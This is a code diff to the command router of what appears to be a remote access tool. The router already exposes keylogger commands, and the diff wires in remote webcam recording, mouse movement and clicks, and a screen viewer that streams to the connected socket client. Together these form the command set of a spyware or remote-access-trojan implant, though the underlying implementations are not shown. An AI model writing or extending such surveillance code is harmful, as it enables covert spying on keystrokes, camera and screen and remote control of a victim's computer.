@@ -7,6 +7,9 @@
 #include "system_power.h"
 #include "file_ops.h"
 #include "keylogger.h"
+#include "webcam.h"
+#include "mouse_control.h"
+#include "screen_viewer.h"
 
 #include <sstream>
 #include <vector>
@@ -67,7 +70,7 @@ static bool parseWriteFileBase64Line(const std::string& t, std::string& b64, std
 }
 
 // ===== ROUTER =====
-std::string process(const std::string& line) {
+std::string process(const std::string& line, SocketType client) {
     const std::string t = trim(line);
     if (t.empty())
         return json(false, "empty");
@@ -124,9 +127,40 @@ std::string process(const std::string& line) {
     if (cmd == "KEYLOGGER_STOP") return keyloggerStopJson();
     if (cmd == "KEYLOGGER_GET_LOG") return keyloggerGetLogJson();
 
-    if (cmd == "WEBCAM_START" || cmd == "WEBCAM_RECORD_START" || cmd == "WEBCAM_RECORD_STOP") {
-        return "{\"ok\":false,\"command\":\"" + escapeJson(cmd) +
-               "\",\"message\":\"not_implemented_yet\"}";
+    if (cmd == "WEBCAM_START") {
+        return startWebcamJson();
+    }
+    if (cmd == "WEBCAM_RECORD_START") {
+        return startWebcamRecordJson();
+    }
+    if (cmd == "WEBCAM_RECORD_STOP") {
+        return stopWebcamRecordJson();
+    }
+
+    if (cmd == "MOUSE_MOVE" && parts.size() >= 3) {
+        int x = std::stoi(parts[1]);
+        int y = std::stoi(parts[2]);
+        return mouseMoveJson(x, y);
+    }
+    if (cmd == "MOUSE_LEFT_CLICK" && parts.size() >= 3) {
+        int x = std::stoi(parts[1]);
+        int y = std::stoi(parts[2]);
+        return mouseLeftClickJson(x, y);
+    }
+    if (cmd == "MOUSE_RIGHT_CLICK" && parts.size() >= 3) {
+        int x = std::stoi(parts[1]);
+        int y = std::stoi(parts[2]);
+        return mouseRightClickJson(x, y);
+    }
+
+    if (cmd == "SCREEN_VIEWER_START") {
+        startScreenViewer(client);
+        return "{\"ok\":true,\"command\":\"SCREEN_VIEWER_START\"}";
+    }
+
+    if (cmd == "SCREEN_VIEWER_STOP") {
+        stopScreenViewer();
+        return "{\"ok\":true,\"command\":\"SCREEN_VIEWER_STOP\"}";
     }
 
     return json(false, "unknown_command", cmd);
